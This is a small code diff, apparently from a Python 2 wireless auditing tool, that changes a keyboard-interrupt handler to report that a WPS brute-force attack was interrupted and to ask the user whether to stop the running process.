-	except KeyboardInterrupt: print R+'\n (^C)'+O+' interrupted\n'+W
+	except KeyboardInterrupt:
+		print R+'\n (^C)'+O+' WPS brute-force attack interrupted'+W
+		if attack_interrupted_prompt():
+			send_interrupt(proc)
+			print ''
+	
 	except EOFError:          print R+'\n (^D)'+O+' interrupted\n'+W
 	
 	exit_gracefully(0)
